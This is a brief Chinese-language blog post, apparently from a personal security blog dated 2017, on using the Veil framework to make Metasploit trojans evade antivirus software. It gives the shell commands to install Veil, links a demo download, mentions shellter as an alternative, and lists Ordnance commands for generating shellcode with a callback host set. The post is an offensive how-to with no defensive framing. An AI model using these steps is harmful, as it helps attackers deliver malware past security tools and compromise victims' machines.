---
title: 利用Veil免杀msf木马
date: 2017-11-05 13:16:09
categories:
	- metasploit
tags:
	- metasploit
---

绕过杀软<!-- more -->

## 安装
```
apt-get -y install git 
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
cd setup
sudo ./setup.sh -c
```

## 演示
```
链接：http://pan.baidu.com/s/1gfB025t 密码：edq4
```

* * * 
```
shellter这个软件也能做到免杀，就不一一演示了。

当然你也可以利用Veil生成shellcode自己免杀。

use Ordnance 使用这个tools
list payloads 查看payloads模块
use payloadsname payloadsname填写你选择payloads模块的名字 
set 参数 参数值   设置参数 ex：set lhost 172.16.60.180 
generate 生成shellcode

```
![shellcode](http://owrmua5nw.bkt.clouddn.com/shellcode.png)